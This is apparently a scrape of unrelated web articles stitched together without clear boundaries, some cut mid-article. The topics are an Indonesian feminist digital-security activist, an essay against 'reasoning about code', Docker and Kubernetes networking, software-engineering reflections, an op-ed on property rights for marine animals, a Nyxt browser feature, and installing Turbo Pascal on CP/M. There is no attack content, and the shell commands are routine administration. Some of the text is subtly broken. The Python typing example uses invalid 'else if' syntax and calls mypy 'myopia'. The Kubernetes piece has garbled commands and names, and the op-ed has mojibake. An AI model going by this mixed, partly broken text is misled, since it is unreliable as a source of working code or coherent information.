<p>Over the past few years, she has turned her gaze online, after concluding that women are just as unsafe in digital spaces as they are on the street. Like most women — and particularly activists — on social media, Caturani routinely faces threats of violence and abuse. In 2010,<strong> </strong>after she posted on Facebook about a protest against a government official who publicly blamed a rape victim for wearing a miniskirt on public transport, a man sent her a message saying: “You deserve to be raped. Just wait, there will be someone who comes to rape you.”&nbsp;</p>



<p>Caturani says the threat was particularly disturbing because the sender wasn’t a random stranger —&nbsp;he had attended a workshop that she had been involved in. “I thought he may have known where I live,” she says.</p>

<p>Most of the threats Caturani received came from male social media users. Women do go on the attack online, but their threats are different, Caturani says. Male users often target women’s bodies and sexuality, usually through rape threats or name-calling.</p>



<p>In 2014, Caturani began to research security techniques for women online. She found that the software she needed to protect herself — even basic products, such as password managers, programs to safeguard sensitive files, and virtual private networks — were out of reach for most people in Indonesia, and especially women and marginalized groups. Getting and using them assumed layers of privilege that may not have occurred to developers — including being able to afford digital tools and being fluent enough in English to use them. “You have to have the knowledge first, and that’s a privilege,” Caturani says. “Digital security was still very masculine, so I had problems when entering the ecosystem.”</p>



<p>Those same biases have led to the creation of unsafe spaces for women, Caturani says.&nbsp;</p>



<p>In Indonesia, cases of online gender-based violence spiked by 300% in 2019, according to a report by Komnas Perempuan, the national commission on violence against women. Caturani says that social media platforms bear some responsibility for this.&nbsp;</p>



<p>“The platforms allow people to commit violence because of the way they were created. They never considered safety for women,” she says. “The platforms were built by the biases of their developers, which is why the platforms become unsafe and marginalize many people.”</p>



<p>Caturani was one of 50 activists convened by the Association for Progressive Communications, an independent network of activists, for a 2014 meeting that led to the formulation of the <a href="https://www.apc.org/en/pubs/feminist-principles-internet-version-20">Feminist Principles of the Internet</a>.</p>



<p>The 15 principles — which were updated in 2016 to include two additional points — are designed to reclaim the internet for women and minority groups. They reject surveillance, anonymity restrictions, online gender-based violence, and attempts to control data and women’s expression by the state and corporations. They ask for greater access, greater data protection, inclusion at decision-making tables, more free and open source tech, and embedding the ethics of consent into the design and policies of internet platforms.</p>



<p>In 2015, Caturani founded PurpleCode in Jakarta to help implement these principles. At the time, there was a growing number of online feminist initiatives in Indonesia. There was <a href="https://magdalene.co/"><em>Magdalene</em></a>, a feminist online magazine <a href="https://www.splicemedia.com/magdalene-indonesia/">set up in 2013</a>; <a href="https://www.facebook.com/groups/jakartafeminist">Jakarta Feminist Discussion Group</a>, a Facebook group created in 2014 that <a href="https://www.jakartafeminist.com/">later evolved into a formal association</a>; and <a href="http://indonesiafeminis.com/">Indonesia Feminis</a>, a multiplatform provider of feminist news and events established in 2015.</p>



<p>But unlike those outlets, which simply use technology to disseminate information, Caturani says that PurpleCode’s main purpose is to question technology and disrupt its culture by encouraging more women and minority groups to become developers and to get involved in designing governance structures in tech.</p>



<p>Until the pandemic forced PurpleCode’s physical space to shut, it hosted incubation programs, workshops, and training for women and gender-nonconforming people. When it reopens, Caturani hopes to hold coding classes for middle and high school–age girls.</p>



<p>While the issues that Caturani first identified a decade ago seem as or more prevalent today, Caturani says that is partly because Indonesian women now have the language to articulate their concerns. As it is increasingly common for people to talk publicly about online violence, more women are able to identify experiences they have had as violent.&nbsp;</p>



<p>PurpleCode’s work has taken on fresh relevance over the past few months. Demonstrations against the government have been <a href="https://restofworld.org/2020/hacking-democracy/">met with a campaign of digital threats against protesters</a>, and the collective’s security tools have been adopted by a number of activists.&nbsp;</p>



<p>Caturani says that, as protests increasingly move online, it is vital to remember how the internet is not just a tool for the movement but a place where real people live and interact.</p>



<p>“If the internet is our space to build movements, then [it] must be fought for to be the space we all had imagined it to be at the beginning,” she says.</p>

		<p>Another day, another post telling me to do something, or not do something, or adopt some technology, or not adopt some technology, or whatever it is that they want me to do, because it makes it easier to “reason about the code”.</p>
<p>It’s a scam.</p>
<p>More precisely, it’s a thought-terminating cliche. Ironic, as the phrase “reason about” is used as a highfalutin synonym for “think about”. The idea is that there’s nowhere to go from here. I want to do things one way, some random on medium dot com wants me to do things another way, their way makes it easier to reason about the code, therefore that’s the better approach.</p>
<p>It’s a scam.</p>
<p>Let’s start with the fact that people don’t think—sorry, reason—about things the same way. If we did, then there’d be little point to things like film review sites, code style guides, or democracy. We don’t know precisely <em>what</em> influences different people to think in different ways about different things, but we have some ideas. Some of the ideas just raise other questions: like if you say “it’s a cultural difference” then we have to ask “well, why is it normal for all of the people in that culture to think this way, and all of the people in this culture to think that way?”</p>
<p>This difference between modes of thought arises in computing. We know, for example, that you can basically use any programming language for basically any purpose, because back in the days when there were intellectual giants in computering they demonstrated that all of these languages are interchangeable. They did so before we’d designed the languages. So choice of programming language is arbitrary, unless motivated by external circumstances like which vendor your CTO plays squash with or whether you are by nature populist or contrarian.</p>
<p>Such differences arise elsewhere than in choice of language. Comprehension of paradigms, for example: the Smalltalk folks noticed it was easier to teach object-oriented programming to children than to professional programmers, because the professional programmers already had mental toolkits for comprehending programming that didn’t integrate with the object model. It’s easier for them to “reason about” imperative code than objects.</p>
<p>OK, so when someone says that something makes it easier to “reason about” the code, what they mean is that <em>that person</em> find it easier to think about code in the presence of this property. I mean, assuming they <em>do</em>, and are not disingenuously proposing a suggestion that you do something when they’ve run out of reasons you should do it but still think it’d be a good idea.  But wait.</p>
<p>It’s a scam.</p>
<p>Code is a particular representation of, at best, <em>yesterday’s</em> understanding of the problem you’re trying to solve. “Reasoning about code” is by necessity accidental complexity: it’s reflecting on and trying to understand a historical solution of the problem as you once thought it was. That’s effort that could better be focussed on checking whether your understanding of the problem is indeed correct, or needs updating. Or on capturing a solution to an up-to-the-minute model of the problem in executable form.</p>
<p>This points to a need for code to be <em>deletable</em> way faster than it needs to be thought about.</p>
<p>Reasoning about code is a scam.</p>

<h3>Docker <a target="_blank" href="https://developpaper.com/tag/network/" title="View all posts in network">network</a> architecture</h3>
<p><span><img src="https://imgs.developpaper.com/imgs/2895636246-5d3ff687de351_articlex.png" alt="Comparison of docker k8s network architecture" title="Comparison of docker k8s network architecture"></span><br>Design defects:</p>
<ul>
<li>The bridge is virtualized by the host and cannot be addressed externally. If you want to be addressed externally, you need to map the container port to the host port. In fact, port mapping is realized by adding corresponding rules to the NAT table of iptables, which is also called NAT mode. Nat model needs to map various ports, which will limit the capacity of host and increase the complexity of container arrangement.</li>
<li>Port is a scarce resource, which needs to solve the problem of port conflict and dynamic port allocation. This not only complicates the scheduling, but also complicates the configuration of applications, which is manifested in port conflicts, reuse, and exhaustion.</li>
<li>Nat introduces the practice of address segmentation into additional complexity. For example, the IP seen by the application in the container is not the IP exposed to the outside world. Because of the network isolation, the application in the container can only detect the IP of the container, but what needs to be declared is the IP of the host. This information asymmetry will bring problems such as the mechanism of breaking the ring self registration.</li>
</ul>
<h3>K8s network model</h3>
<p>Kubenetes is independent from <a target="_blank" href="https://developpaper.com/tag/docker/" title="View all posts in docker">docker</a> network model (NAT network model) to form a new network model.<br>Each pod has a flat “pod IP” that shares the network namespace.<br>It communicates with other physical machines and pods across the network through podip.<br>The IP per pod model creates a clean, reverse compatible model.<br>In this model, pod can be regarded as virtual machine or physical machine from the aspects of port allocation, network, domain name resolution, service discovery, load balancing, application configuration and migration, and the application can smoothly migrate from the non content environment to the container environment in the same pod.</p>
<p>To implement this model, several problems need to be solved:</p>

<h4>Container to container</h4>
<ul>
<li>Pod is a collection of containers</li>
<li>Pod contains containers that run on the same host and have the same network space. Containers can communicate with each other</li>
<li>The pod running container contains the service container and the network container “pause”</li>
<li>Pause, as the name suggests, prevents the container from exiting</li>
<li>The network container is only used to take over the pod network, and the service container realizes network sharing by joining the network container</li>
</ul>
<p>The pod content manager runs similarly with the following command:</p>
<pre><code>docker run -p 80:80 -p 8080:8080 --name network-container -d gcr.io/google_container/pause:3.1
 
docker run --net container:network-container -d jonlangemak/docker:web_container_8080
</code></pre>
<p>Container network topology in pod<br><span><img src="https://imgs.developpaper.com/imgs/3552196084-5d3ff687b552b_articlex.png" alt="Comparison of docker k8s network architecture" title="Comparison of docker k8s network architecture"></span></p>
<h4>Pod to pod communication</h4>
<ul>
<li>K8s network model is a flat network plane</li>
<li>Pod, as a network unit, is at the same level as <a target="_blank" href="https://developpaper.com/tag/k8s/" title="View all posts in k8s">k8s</a> node network</li>
</ul>
<p>Minimum k8s network topology</p>
<ul>
<li>Communication between pods: pod1 and POD2 (same host), pod1 and pod3 (cross host communication)</li>
<li>Communication between node and Pod: node1 and pod1 / POD2 (same host), pod3 (cross host communication)</li>
</ul>
<p><span><img src="https://imgs.developpaper.com/imgs/1931398686-5d3ff687997c8_articlex.png" alt="Comparison of docker k8s network architecture" title="Comparison of docker k8s network architecture"></span></p>
<p>Question:</p>
<ol>
<li>How to ensure that the podip of pod is globally unique? ·</li>
<li>Pod / container on the same k8s node can communicate natively. How can pod communicate without nodes?</li>
</ol>
<ul>
<li>The podip of the pod is allocated by the docker bridge, so you can configure the docker bridge of different k8s nodes into different IP segments.</li>
<li>Enhance docker, create an overlay network in the container cluster, and connect each node, such as flannel.</li>
</ul>
<h4>Flannel network model</h4>
<ul>
<li>Flannel is an overlay network tool designed by the coreos team</li>
<li>Flannel sets a subnet for the host, encapsulates the communication messages between containers through the tunnel protocol, and realizes the cross host communication of containers.</li>
<li>Flannel needs to be configured with etcd before running</li>
</ul>
<pre><code>etcdctl set /coreos.com/network/config '{"Network": "10.0.0.0/16"}'</code></pre>
<ul>
<li>After configuration, run flannel on node</li>
<li>The configuration in the etcd is checked on initial start-up</li>
<li>Assign available IP segments to the current node</li>
<li>Create a routing table in etcd</li>
</ul>

<h4>Service to pod communication</h4>
<p>Service acts as a “service agent” between pods, which is externally represented as a single access interface to forward requests to the pod.</p>
<pre><code>$ kubectl decsribe service myservice
Name: myservice
Namespace: default
Lables: &lt;none&gt;
Selector: name=mypod
Type: ClusterIP
IP: 10.254.206.220
Port: http 80/TCP
Endpoints: 10.0.62.87:80,10.0.62.88:80,10.0.62.89:80

Session Affinity: None
No evevts.</code></pre>
<p>Read as follows:</p>
<ul>
<li>The virtual IP of service is 10.254.206.220</li>
<li>Port 80 / TCP corresponds to three back ends: 10.0.62.87:80, 10.0.62.88:80, 10.0.62.89:80</li>
<li>Request 10.254.206.220:80 is forwarded to one of these back ends</li>
<li>The virtual IP is created by k8s. The virtual network segment is configured by API server startup parameter service cluster IP range = 10.254.0.0/16</li>
</ul>
<p>The Kube proxy component is responsible for virtual IP routing and forwarding. It implements the virtual forwarding network on the container coverage network. Its functions are as follows:</p>
<ul>
<li>Forward the request of virtual IP accessing the service to endpoints</li>
<li>Monitor the changes of service and endpoints to refresh forwarding rules</li>
<li>Provide load balancing capability</li>
</ul>
<p>The Kube proxy implementation mechanism is specified by the startup parameter — proxy mode</p>
<ul>
<li>Userspace</li>
<li>Currently, Kube proxy is only a layer 3 (TCP / UDP over IP) forwarding, and the default policy is polling.</li>
<li>
<p>Kube proxy will create two iptables rules for the service, including the following two iptables custom chains</p>
<ul>
<li>Kube-ports-container is used to match the messages sent by the container, and is bound in the pre outgoing table of the NAT table</li>
<li>Kube-ports-host is used to match the messages sent by the host and bound to the output chain of the NAT table</li>
</ul>
</li>
<li>The purpose of these two rules is to redirect the message of destination IP 10.254.206.220 and destination port 80 to local port 35841</li>
<li>This port is what Kube proxy listens to</li>
</ul>
<p><span><img src="https://imgs.developpaper.com/imgs/1547281574-5d3ff68794575_articlex.png" alt="Comparison of docker k8s network architecture" title="Comparison of docker k8s network architecture"></span></p>
<ul>
<li>Iptables</li>
</ul>
<p>Through the creation of iptables rules, the virtual IP requests accessing the service are directly redirected to the endpoints. When the endpoints change, the Kube proxy will refresh the relevant iptables rules. In this mode, the Kube proxy is only responsible for monitoring the service and endpoints, updating the iptables rules, and message forwarding depends on the Linux kernel. The default load balancing method is random.<br>&nbsp;</p>

<pre><code>iptables-save | grep myservice</code></pre>
<p>Kube proxy will create a series of iptables rules for the service, including the iptables custom chain:</p>
<ul>
<li>Kube-services: bound in the preouting chain and output chain of the NAT table</li>
<li>Kube-svc – *: represents a service, bound in kube-services</li>
<li>KUBE-SEP-<em>: represents each backend of endpoints, bound to Kube SVC-</em>
</li>
</ul>
<p>Query forwarding rules</p>
<pre><code>iptables -t nat -L -n</code></pre>

<div>
<p>Though I'm right now not employed as a software engineer I have been writing code under various hats for the last few years (As a data scientist, ML engineer, and software engineer). Naturally me being me I have not just done the thing but also reflected about the thing. Questions like what's good software, what does being a good software engineer mean, how should meetings be ran, and so on. Here are some thoughts on that.</p>

<h2 id="the-cost-of-disagreement">The cost of disagreement</h2>
<p>In many cases a disagreement may be over something that both sides agree is not sizable. I can think something is 80% good whereas you think it's just 75% and I can think the opposite of your solution. But we can agree that the cost to resolve that disagreement can defeat the gains from actually choosing the best solution. So "I disagree but let's go ahead" is something that should be done in these cases, with a coin flip if needed. Consensus-driven decision making may be good at some stages, especially if paired with good processes around meetings but it can lead to gridlock.</p>
<p>I'm of course not the first one in proposing the "<a href="https://en.wikipedia.org/wiki/Disagree_and_commit">disagree and commit</a>" principle though I only learned this had a name very recently.</p>
<h2 id="meetings">Meetings</h2>
<p>Meetings can be terrible, meetings can be great. Bad meetings tend to occur because people show up without having thought much about what is to be discussed in the meeting. Isn't the point of the meeting to do the thinking? That's one way, perhaps the most common way of viewing meetings, and it's a lazy default because they don't impose homework on you. But doing the thinking in real time, with many voices to be sequentially heard and given a constrained time is not great for good decision making. Many times I've seen meetings that dragged on forever where disagreements would keep circling back and forth, or where we would simply be talking past each other.</p>
<p>A better way to run meetings, which I also tried, is to collate whatever is it that the outcome should be before the meeting. If it's an architecture design meeting, do the work, usually the meeting owner can do most of it, even if they know it won't be 100% perfect. Then ask for feedback a week ahead of the meeting. Incorporate the feedback to the document, repeat. Note down disagreements; have a literal "Standing disagreements" section in the document with the key points that are not quite agreed on, plus the reasoning behind them. Having everyone review the disagreements and having time to do so, on (digital) paper sets up a clearer goal for the meeting: Iron out specific points. During the meeting, a moderator would go one by one over those points and ask for a decision, then highlighting in bold which option was chosen. Then we would move to the next point and so on. Everyone liked this kind of meeting.</p>
<h2 id="ownership">Ownership</h2>
<p>Lack of ownership is the root of all evil (ok, some exaggeration here). Everyone's problem is no one's problem. In documentation, lack of ownership means finding obsolete documentation and no one person to go to to get it fixed; or what's worse, no system in place to enforce that the documentation is up to date (i.e. every document could disappear 6 months after it's published unless whoever uploaded or created it says otherwise in an email the system sends them after six months, documents shouldn't live rent free). Or having a team dedicated to tirelessly aggregating information so that everything everyone is doing is visible. We had something like this in my first job at the London Electric Vehicle Company (LEVC) and I suspect this may be more common in automotive or aerospace than in software or in biotech.</p>
<p>Apple had a very clever idea in defining <a href="https://twitter.com/michael_nielsen/status/1279478277585817600">Directly Responsible Individuals</a> (DRIs) for everything. Having a name accountable instead of a vague "the team" or "the process" makes it easy to make changes. I think many people are reluctant to blame individuals for mistakes they make, but well timed blame (feedback about what mistakes were made, potentially there being consequences for grave mistakes etc) can both help the blamed individual (They can know what to improve) and the team as a whole to succeed.</p>
<p>Something I once thought is that many decisions that involve estimates could be made into bets, either for small amounts of money or some kind of token. If you say X will be finished in a week and it takes longer, then you lose. This could be gamed by overestimating how long things take, but something like this seems like the right way to get better at making decisions involving uncertainty.</p>
<h2 id="questions-as-systemic-failures">Questions as systemic failures</h2>
<p>Every question asked in an internal Slack is a policy failure. It means the existing information systems failed to deliver an answer, and the user falls back to manually asking the hive mind's tacit knowledge. This has various problems: One, it introduces longer delays between question and answer, especially if whoever knows the answer is in another timezone. Two, it embraces tacit knowledge in a distributed and incoherent fashion: If there is no one true answer there can be many answers and that can lead to disagreements and wrong decisions. Instead, ideally there is a centralized repository of information where for each Q there is one and only one A, and a team dedicated to getting owners of various systems to actually codify their knowledge. This should work well with the ownership system above.</p>

<h2 id="good-software">Good software</h2>
<p>Good software is code that is readable, fast, flexible, and scalable. Out of these only speed is the one that is universally agreed on how to measure. The rest are fuzzy, as are most things in life.</p>
<p>Readable code pretty much depends on who is writing it; <a href="https://github.com/jayfoad/aoc2019apl/blob/master/p12.dyalog">Dyalog</a> looks like <a href="https://en.wikipedia.org/wiki/Brainfuck">Brainfuck</a> to me, and the many parenthesis in Lisps can make code hard to read to someone who is not a lisper (I did the experiment; I spent some time learning basic Clojure and while I remain not a Clojurian, the parenthesis become less of an issue). Lifetimes in Rust seem obscure until one know how they work.</p>
<p>Flexible code is code that is easier to extend. This is hard to quantify but anyone that has coded knows it when they see it; a given piece of code can just effortlessly do something new with a two line change, or it may need a thousand line change to work again. The former is more flexible than the latter. Moreover this flexibility shouldn't come at the expense of readability though sometimes this can be the case.</p>
<p>Scalable code is code that works well with small as well as big inputs, this can be achieved in a single machine or many.</p>
<p>The extent to which these matter depend on who is developing it (Readable code depends on individual preferences), and flexibility is not really needed if the end result is more or less fixed; but it's really desired in a startup that is constantly adapting. In that environment, speed may be sacrificed for extra flexibility.</p>
<p>The code that should be written absent any constraints is good code, but real life situations means that the right thing to do is to make tradeoffs and move ahead. Those decisions are at the heart of what experience in software engineering is.</p>
<h2 id="static-types">Static types</h2>
<p>Static typing is great. Early on in a codebase in Python back at Aiden.ai, we made the decision of going for static typing using myopia as much as we could. So instead of writing something like</p>
<pre><code><span>def </span><span>sum_one</span><span>(</span><span>x</span><span>):
  </span><span>return </span><span>x+</span><span>1
</span></code></pre>
<p>We would rather much write</p>
<pre><code><span>def </span><span>sum_one</span><span>(</span><span>x</span><span>:int)-&gt;int:
  </span><span>return </span><span>x+</span><span>1
</span></code></pre>
<p>Or even further, in some cases we would use <em>newtypes</em> to make these type annotations more meaningful, dataclasses to bundle data together, as well as exhaustive enumerations to ensure that all variants of an enum get handled, for example:</p>
<pre><code><span>class </span><span>Operation</span><span>(</span><span>Enum</span><span>):
  </span><span>Multiply="</span><span>Multiply</span><span>"
  Add="</span><span>Add</span><span>"
Value = Union[int,float]
</span><span>def </span><span>assert_never</span><span>(</span><span>x</span><span>: NoReturn) -&gt; NoReturn:
    </span><span>raise </span><span>AssertionError</span><span>(</span><span>f</span><span>"</span><span>Invalid value: </span><span>{x</span><span>!r</span><span>}")
</span><span>def </span><span>do_the_op</span><span>(</span><span>a</span><span>:Value,</span><span>b</span><span>: Value, </span><span>op</span><span>:Operation) -&gt; Value:
  </span><span>if </span><span>op is Operation.Multiply:
    </span><span>return </span><span>a*b
  </span><span>else if </span><span>op is Operation.Add:
    </span><span>return </span><span>a+b
  </span><span>else</span><span>:
    </span><span>assert_never</span><span>(op)   
  
</span></code></pre>
<p>So if we ever say remove an operation or add a new one, mypy will force us to handle it. This is enforced dynamically but most importantly also statically so the code won't pass tests if there is a missing variant.</p>
<p>All these typing (Plus a custom pandas typechecker I wrote, but that's another story) made it relatively easy to refactor, and add new features when we needed to do so. It would have been a huge pain to fly blind without the types. Python has a tendency to blow up in your face when you least expect it. Starting with types from day 1 is something I don't regret having gone for, it didn't make the coding any slower and saved a lot of time (Or so we imagine!).</p>
<p>There seems to be a trend now towards types everywhere. Javascript died (for any serious developer) to let Typescript rise and Ruby, while still around with the Sorbet type checker, got Crystal.</p>
<p>As a <a href="https://en.wikiquote.org/wiki/Theodore_Kaczynski#:%7E:text=Consistent%20failure%20to%20attain%20goals,low%20self%2Desteem%20or%20depression.&amp;text=text%20on%20wikisource-,The%20Industrial%20Revolution%20and%20its%20consequences%20have,disaster%20for%20the%20human%20race.&amp;text=The%20industrial%2Dtechnological%20system%20may%20survive%20or%20it%20may%20break%20down.">wise man</a> once said, <em>Python and its consequences have been a disaster for the human race</em>. Python has a tendency to blow up in your face, even with all the typing. The typechecker may be happy but it doesn't guarantee that if it thinks something is type T it's actually so, maybe what you thought was a number is actually a string and because of duck typing it can take a few function calls for the error to manifest itself.</p>
<h2 id="yolo-programming-vs-chill-programming">YOLO programming vs chill programming</h2>
<p>I believe there is a tradeoff between writing a lot of code and writing correct code. In a day you could write X lines of code or you could write X/2. Two days of programmer B will produce the same as one day of programmer A but probably the latter will have introduced fewer bugs. You can write more or less tests, you can be more or less sure that something you just wrote is actually correct.</p>
<p>As you can expect from the number of typos here, I'm more of a YOLO programmer than a chill programmer. I'm the guy that was once pushing to prod from a one-handed GitHub hot fix from my phone as I was having dinner in a hotel in Tokyo (That one did work!).</p>
<p>YOLO programming when the programming language …</p></div></article></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p><span>L</span>ater this year, the United Nations will finish hosting the final negotiations on a new conservation treaty for the high seas, as waters that lie outside national jurisdiction are known. These cover more than half of Earthâ€™s surface and contain much of the planetâ€™s biodiversity. The moment marks a tremendous opportunity in humanity's losing battle against biodiversity loss.&nbsp;</p>

<p>Thus far, however, conversations about how best to protect the high seas have missed a crucial element, one that could well be the single boldest, most important conservation move that humankind could make: recognizing the property interests of the marine species now living there.</p>
<p>Every whale and shark and sea turtle, every tuna and toothfish, every octopus and even every salp and sea urchin and anemone, has a right to own their part of the ocean.&nbsp;</p>
<p>What does it mean to say that animals have a right to own property? To many people this might seem like a radical idea. Those who follow animal law might say that itâ€™s too big an ask. After all, itâ€™s generally understood that in the United States and most of the worldâ€™s nations, animals have very limited legal rights. When activists have fought for legal personhood for animals—as when the People for the Ethical Treatment of Animals sued SeaWorld for allegedly violating the 13th Amendment rights of orcas, or the Nonhuman Rights Projectâ€™s habeas corpus lawsuits on behalf of captive chimpanzees and elephants—they have usually lost. &nbsp;</p>
<p>Itâ€™s not so unprecedented, though. Many existing laws afford certain non-human animals legal interests to the environments in which they live. In the United States, for example, thanks to the federal Bald and Golden Eagle Protection Act, a golden eagleâ€™s claim to the tree in which she nests outweighs the right of the treeâ€™s human landowners to cut it down. Most public lands—approximately one-third of the landmass of the United States—are partially managed for animal interests. In the past decade, most states have enacted laws allowing pets to own property bequeathed to them in trust. Some tribal nations in the U.S. have <a href="https://www.motherjones.com/environment/2019/09/some-indigenous-communities-have-a-new-way-to-fight-climate-change-give-personhood-rights-to-nature/" target="_blank">afforded legal personhood to natural entities</a>, such as wild rice in Chippewa ceded territories, which would allow humans to file lawsuits in tribal courts on behalf of rice. Outside the U.S., New Zealandâ€™s Whanganui River was&nbsp; granted legal personhood in 2017, and Ecuadorâ€™s constitution explicitly recognizes the rights of nature to persist and regenerate. Once-unthinkable assertions of rights for natureâ€™s beings are becoming commonplace.&nbsp;&nbsp;</p>
<p>These developments lay the foundations for explicitly recognizing wildlife as property owners. In contrast to how legal scholars historically viewed property—with ownership as an all-or-nothing affair—new models envision property rights as overlapping, a pluralistic conception of ownership in which humans and nonhumans alike can both have legally actionable interests in the same physical space. In this way, modern property law is beginning to embrace what many Indigenous cultures never forgot: Plants and non-human animals are our co-participants in life on Earth.&nbsp;</p>
<figure><img src="https://s3.amazonaws.com/nautilus-vertical/oceans_fa5d715c26f0d0b32cc9e4af2328b174.jpg" alt="Pelagic predator map"><figcaption><span>A map of the Pacific Ocean overlaid with tracking data from 23 species of large marine predators underscores how the high seas teems with life. </span><br><span><a href="http://oceans.nautil.us/feature/669/topp.org/">Global Tagging of Pelagic Predators</a></span></figcaption></figure>
<p>As applied to the high seas, this suggests that marine species could be understood as owners of the oceanic commons they occupy or, at least, co-owners with the recognized interests of nation-states. Under nearly every legal standard except the unstated qualifier of being a member of the human species, marine animals have property interests to the ocean.&nbsp;</p>
<p>What would this mean in practice? It could take a number of legal forms. One option is for marine species to hold ocean waters in trusts, similar to existing trusts for domestic animals. Humans would be appointed to manage ocean ecosystems for the benefit of the nonhuman living there. They wouldnâ€™t need to consider the fate of every individual fish, but would be legally required to protect the well-being of species and populations.&nbsp;</p>
<p>&nbsp;Alternatively, the United Nations might look to the influential work of philosophers Sue Donaldson and Will Kymlicka, who have theorized that <a href="https://www.willkymlicka.ca/publications/books/zoopolis/" target="_blank">different kinds of animals could be accorded different types of citizenship</a>. Donaldson and Kymlicka write that domestic animals ought to be treated as full citizens of our own societies, while wild creatures can be likened to citizens of other nations. The United Nations might might even create a legal nation-state for marine species, with humans representing them in international affairs.&nbsp;</p>
<p>The United Nations could also simply list marine species as a member of the ocean commons, affording legal recognition of animal interests alongside that of the nations that collectively own the high seas. This would require subsequent treaties to consider wildlife interests.&nbsp;</p>
<p>In all these cases, a formal recognition of rights would advance marine speciesâ€™ interests in the high seas—and not merely through the human-centered goal of sustainable fisheries management of fisheries, but by elevating the larger biodiversity goals that are at the center of the high seas treaty negotiations now taking place. &nbsp;</p>
<blockquote>Every whale and shark and sea turtle, every tuna and toothfish, every octopus and even every salp and sea urchin and anemone, has a right to own their part of the ocean.<br></blockquote>
<p>Right now, however, negotiators at the Intergovernmental Conference on Marine Biodiversity of Areas Beyond National Jurisdiction—as the U.N. body drafting the treaty is formally known—are actually moving in the opposite direction. Theyâ€™re considering dividing the high seas between nations and regions. Nonhuman rights are not on the table.</p>
<p>To be sure, this is part of conversations that also include proposals for marine protected areas and restrictions on high seas fishing, both of which of which would do much to advance the interests of non-human ocean users. But divvying up the ocean without formally acknowledging the ownership interests of the creatures now living there replicates the fatal flaw that colonial governments made when they demarcated land boundaries. Rather than being required to consider the rights of wildlife in future actions, countries and regional management organizations will be able to diminish them even further.&nbsp;</p>
<p>Thatâ€™s especially likely if regional fisheries management organizations acquire more power, which seems likely. They have a poor track record of biodiversity preservation—and, if given the chance, nations engaged in economic competition over the high seas' resources will engage in a race-to-the-bottom. Devastating biodiversity loss will almost certainly occur, hastening the sixth extinction.
	</p>
<p>To avoid further expropriating Earth from other species, the new treaty should permanently title the high seas to its animal occupants. This would radically shift humankind's trajectory—but, vitally, it would not eliminate human uses of the high seas. Humans could still catch fish and ship goods. It would simply require animal interests in having thriving ecosystems to be represented far more robustly than they have been.</p>
<p>The high seas represents a rare opportunity to preserve animal interests on a global scale; the United Nations has the power to shift the course of life on Earth for the better. We must not waste it.</p>

<p>Nyxt has a new visual-mode (mouseless text selection)!</p>
<p><img src="https://nyxt.atlas.engineer/static/image/article/visual-mode-select.png"></p>

<p>Visual mode is a mouseless way of selecting <span>any</span> text on any page (with as few keystrokes as possible). Conceptually based on <code>vi</code>'s visual mode, Nyxt adapts it for the web.</p>

<p>The first step is to run the <code>visual-mode</code> command.</p>
<p><img src="https://nyxt.atlas.engineer/static/image/article/visual-mode-enable.png"></p>
<p>After doing so, you will be presented with hints to select a starting paragraph for your cursor.</p>
<p><img src="https://nyxt.atlas.engineer/static/image/article/visual-mode-paragraph.png"></p>
<p>Upon selecting a paragraph, a cursor will appear. You can move the cursor around and press <code>shift-space</code> to toggle the mark (start/stop highlighting).</p>
<p><img src="https://nyxt.atlas.engineer/static/image/article/visual-mode-cursor.png"></p>
<p>Importantly, you can use all your favorite keybindings (move by word, move to next line, beginning of line, etc.)!</p>
<p><img src="https://nyxt.atlas.engineer/static/image/article/visual-mode-select.png"></p>
<p>Eureka! Just like that, we have selected text, no mouse required!</p>

<p>A very special thank you to <span data-cites="kssytsrk">@kssytsrk</span> for this wonderful addition to Nyxt!</p>
<p>Thanks for reading :-)</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
        <p>CP/M was blessed with many programming languages, each with their own strengths and weaknesses.  I think that Turbo Pascal stands out from these and I'm not alone.  When Turbo Pascal was released in 1983 by Borland, as their first software development application, it was quickly adopted by schools, universities, hobbyists and professional software developers.  Turbo Pascal combined ease of use, power, speed and a great manual all for the really low price of $49.95.</p>
<h2>Why Use Turbo Pascal Under CP/M?</h2>
<p>With TP you get an Integrated Development Environment (IDE), so that you can edit, compile and run all from the same application.  Since the IDE is only 34Kb there is plenty of space left on a disk for your source code and compiled programs.  This is particularly handy for single disk machines.  The editor is very functional and uses a subset of the Wordstar key combinations.</p>
<p>Pascal was designed to be easy to compile and because TP uses a single pass compiler, compilation speed is incredibly quick.  The downside of the compilation speed is that the code is quite a literal translation without much optimization.  However, for many applications this won't be much of an issue compared to the increased programmer productivity.</p>
<p>If you need parts of your program to run faster, you can always embed inline machine code into functions/procedures or access functions in external binaries.  The latter option allows you to create libraries in assembly language and use a jump table to access individual functions with the <code>external</code> keyword.</p>
<p>In 1986 Borland released Turbo Pascal 3.0 which added support for <em>overlays</em>.  The running code could now be swapped in and out from disk as needed.  With careful planning, you could escape the normal 64Kb limit and only be constrained by the capacity of the disk you are running the application from.</p>
<p>The standard library offers a good range of functions and TP keeps quite close to Standard Pascal as defined by Jensen &amp; Wirth in their '<a href="http://books.google.co.uk/books?id=xXSZbSLFTM8C&amp;printsec=frontcover#v=onepage&amp;q&amp;f=false">User Manual and Report</a>'.  As with all Pascal implementations, there are problems porting programs between implementations.  However, if you aren't using any of the operating system specific calls, then you can easily port to the MS-DOS and CP/M-86 versions.  My only gripe is that TP doesn't support procedures and functions passed as parameters.</p>
<p>Finally, Borland included a highly readable and very complete <a href="http://bitsavers.trailing-edge.com/pdf/borland/turbo_pascal/Turbo_Pascal_Version_3.0_Reference_Manual_1986.pdf">manual</a>.  It covered not just the IDE, language and libraries, but also detailed information on the memory layout and calling conventions from assembly language.  This meant that you could quickly get up and running with few additional resources.</p>
<h2>How to install</h2>
<p>First download <a href="http://www.retroarchive.org/cpm/lang/TP_301A.ZIP">Turbo Pascal 3.01a</a> for CP/M-80 and unzip the archive.</p>
<p>Put at least <code>TINST.*</code> and <code>TURBO.*</code> files onto a disk.  The real advantage of not copying all the files is seen if you only have a single drive.  The extra room will allow you to edit, compile and run your programs all from the same disk.  For instructions on how to create a virtual disk for z80pack look at: <a href="https://techtinkering.com/articles/emulating-a-cpm-system-with-z80pack/">Emulating a CP/M System With z80pack</a>.</p>
<p>Boot up your CP/M system, put in the disk with TP on it and change to this drive if necessary.  In my examples I am using <code>B:</code></p>
<p>Run the <code>TINST</code> program to set up the screen:</p>
<pre><code>B&gt; tinst
</code></pre>
